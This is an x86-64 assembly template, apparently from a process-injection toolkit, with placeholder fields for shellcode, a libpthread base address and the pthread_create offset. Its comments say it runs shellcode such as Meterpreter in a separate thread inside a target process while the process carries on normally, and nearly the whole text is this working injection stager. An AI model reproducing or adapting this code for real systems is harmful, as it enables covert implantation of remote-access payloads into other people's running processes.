# This code will launch the specified binary shellcode (e.g. Meterpreter)
# in a new, separate thread, then return to the original code
# so that the target process continues executing normally after injection
# However, it requires the offset for pthread_create in libpthread to do this
#
# WARNING: the binary shellcode can still cause the entire target process
# to exit. For example, with the default build options, Meterpreter will 
# happily execute in a separate thread, but if you execute the "exit" 
# command from the Meterpreter shell, it will kill the entire target process

mov rcx, 0
lea rax, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
mov rdx, rax
mov rsi, 0
mov rax, arbitrary_read_write_data_address[rip]
mov rdi, rax
mov r9, [BASEADDRESS:.+/libpthread-[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:pthread_create@@GLIBC_2.2.5:RELATIVEOFFSET]
call r9

[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:

# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

[VARIABLE:INLINE_SHELLCODE:VARIABLE]

jump_back_from_shellcode:

jmp [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]